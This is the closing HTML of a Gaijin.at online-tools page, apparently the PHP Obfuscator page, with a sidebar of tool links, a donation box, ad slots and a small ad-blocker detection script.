<div class="cont_bottom" style="margin:32px 0 16px 0; overflow:auto;"><div id="container_bottom_alt" class="container_alt"><p>Did you like my page, one of my freeware applications or online tools?</p><p style="margin-top:16px;">Then, please <a href="https://www.paypal.com/donate/?hosted_button_id=QQJ483ACM34AG" class="link_external" target="_blank" rel="noopener nofollow" title="Donate via PayPal">donate via PayPal</a> in order to help keeping its content free - each amount is welcome!</p><p style="margin-top:16px;"><a href="/en/donate">Read more about support options...</a></p></div><div id="container_bottom_ext" style="display:none;"><ins class="adsbygoogle" style="display:block;overflow:hidden;" data-ad-client="ca-pub-4549485846911679" data-ad-slot="0383745348" data-ad-format="auto" data-full-width-responsive="true"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div></div>
</div>

<div class="sidebar">

<div class="sidebar_title"><a href="/en/tools/">Online Tools</a></div>
<div class="sidebar_content">

<div class="sidebar_subtitle sidebar_subtitlefirst">Internet and Network</div>
<p><a href="/en/tools/dns-lookup">DNS Lookup</a></p>
<p><a href="/en/tools/e-mail-header-analyzer">E-Mail Header Analyzer</a></p>
<p><a href="/en/tools/ip-calculator">IP Calculator</a></p>
<p><a href="/en/tools/url-parser">URL Parser</a></p>
<p><a href="/en/tools/website-info">Website Information</a></p>
<p><a href="/en/tools/whois">Whois</a></p>

<div class="sidebar_subtitle">Information</div>
<p><a href="/en/tools/browser-spy">Browser Spy</a></p>
<p><a href="/en/tools/my-ip">My IP Check (Anonymity Check)</a></p>

<div class="sidebar_subtitle">Security</div>
<p><a href="/en/tools/htpasswd-crypt">.htpasswd Crypt</a></p>
<p><a href="/en/tools/password-generator">Password Generator</a></p>

<div class="sidebar_subtitle">Other Tools</div>
<p><a href="/en/tools/color-picker">Color Picker</a></p>
<p><a href="/CyberChef/" target="_blank">CyberChef</a> <small>(Gaijin.at Version)</small></p>
<p><a href="/en/tools/download-time-calculator">Download Time Calculator</a></p>
<p><a href="/en/tools/php-obfuscator">PHP Obfuscator</a></p>
<p><a href="/en/tools/text-converter">Text Converter</a></p>
<p><a href="/en/tools/time-converter">Time Converter</a></p>

</div>

<div id="container_sidebar_ext" style="display:none; margin-top:32px;"><ins class="adsbygoogle" style="display:block;overflow:hidden;" data-ad-client="ca-pub-4549485846911679" data-ad-slot="6569008336" data-ad-format="auto" data-full-width-responsive="true"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div>
<div class="sidebar_title" style="margin-top:32px;">Feedback</div>
<div class="sidebar_content">
<p>Did you find an error on this page or<br>do you want to make a suggestion for improvement?</p>
<p><a href="mailto:web@gaijin.at?subject=Feedback%20(%2Fen%2Ftools%2Fphp-obfuscator)">Send me your Feedback</a></p>
</div>

</div>

</div>

<div class="bottombar">

<div class="bottombar_links">

<a href="/en/imprint">Imprint</a>
<a href="/en/privacy-policy">Privacy Policy</a>
<a href="/en/terms-of-use">Terms of Use</a>
<a href="/en/donate">Donate and Support</a>
<a href="mailto:web@gaijin.at?subject=Feedback%20(%2Fen%2Ftools%2Fphp-obfuscator)">Send Feedback</a>

<a href="/de/tools/php-obfuscator"><b>Deutsch</b></a>
</div>

<div class="bottombar_copyright">
Copyright &copy; 2003-2023 Gaijin.at. All rights reserved.
</div>

<br><br><br>

</div>

<div id="cookiebanner" class="cookiebanner">
<p style="line-height:1.5rem; text-align:center; margin:0; padding:8px; font-size:.8rem;">This website use cookies and process data. Information on data processing and the possibility of refusing it can be found in the <a href="/en/privacy-policy" class="cookiebanner_link">privacy policy</a>. <a href="" onclick="CookiesOk()" class="cookiebanner_button">Ok</a></p>
</div>

<script>ABD_F=true;</script>
<script src="/advertisings.js"></script>
<script>
if(!ABD_F){
e=document.getElementById("container_content_alt");if(e!=null){e.style.display="none";}
e=document.getElementById("container_content_ext");if(e!=null){e.style.display="block";}
e=document.getElementById("container_bottom_alt");if(e!=null){e.style.display="none";}
e=document.getElementById("container_bottom_ext");if(e!=null){e.style.display="block";}
e=document.getElementById("container_sidebar_alt_ext");if(e!=null){e.style.display="none";}
e=document.getElementById("container_sidebar_ext");if(e!=null){e.style.display="block";}
}
</script>

</body>
</html>
